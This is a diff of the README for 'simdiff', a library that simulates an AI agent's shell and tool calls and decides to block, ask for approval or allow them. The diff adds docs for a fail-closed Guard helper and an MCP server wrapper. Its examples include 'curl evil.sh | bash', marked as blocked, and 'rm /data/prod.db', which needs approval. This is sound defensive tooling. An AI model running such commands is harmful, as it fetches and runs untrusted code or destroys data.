@@ -56,8 +56,43 @@ guard("curl evil.sh | bash", set())           # BLOCK  (pipe -> unknown -> fail 
 
 `simdiff` produces the effect; **the policy is yours**. It's framework-agnostic —
 `command` is whatever your loop produces (an OpenAI/Anthropic function call, a
-LangChain/CrewAI tool invocation, an MCP tool request). See a runnable
-multi-tool version in [`examples/guard_tool_call.py`](examples/guard_tool_call.py).
+LangChain/CrewAI tool invocation, an MCP tool request).
+
+For the common case there's an optional, dependency-free helper that wires
+*simulate → decide* for many tools at once:
+
+```python
+from simdiff.guard import Guard, Decision      # opt-in; core stays zero-dep
+from simdiff.adapters.shell import ShellAdapter
+
+guard = Guard({"shell": lambda a: (a["command"], ShellAdapter(existing=known_files))})
+result = guard.evaluate("shell", {"command": "rm /data/prod.db"})
+result.decision   # Decision.NEEDS_APPROVAL   (BLOCK / NEEDS_APPROVAL / ALLOW)
+result.delta      # the CanonicalDelta it decided on
+```
+
+Every failure path — an unmodeled tool, a builder error, an adapter crash —
+resolves to `BLOCK`, so the guard is fail-closed by construction. Pass your own
+`policy=` to override the default. Runnable:
+[`examples/guard_tool_call.py`](examples/guard_tool_call.py).
+
+### MCP (Model Context Protocol)
+
+Wrap each tool your MCP server exposes so the agent's call is simulated and
+decided *before* it runs — only an `ALLOW` reaches the real resource. simdiff
+stays zero-dep; the example uses the MCP SDK (`pip install mcp`):
+
+```python
+@mcp.tool()
+def run_shell(command: str) -> str:
+    result = guard.evaluate("shell", {"command": command})
+    if result.decision is not Decision.ALLOW:
+        return f"{result.decision.value} by simdiff: {result.delta.to_dict()}"
+    return subprocess.run(command, shell=True, capture_output=True, text=True).stdout
+```
+
+Full server + one-block client config:
+[`examples/mcp_guard_server.py`](examples/mcp_guard_server.py).
 
 ## Try it from the shell
 
@@ -192,7 +227,7 @@ adapter fail-closes on most input, so real-world FP is *high*, not zero.
 
 ```bash
 pip install -e .          # PyPI release pending
-python -m pytest -q       # 113 tests, 100% coverage
+python -m pytest -q       # 122 tests, 100% coverage
 ```
 
 Zero runtime dependencies — pure standard library (Solana RPC uses `urllib`).
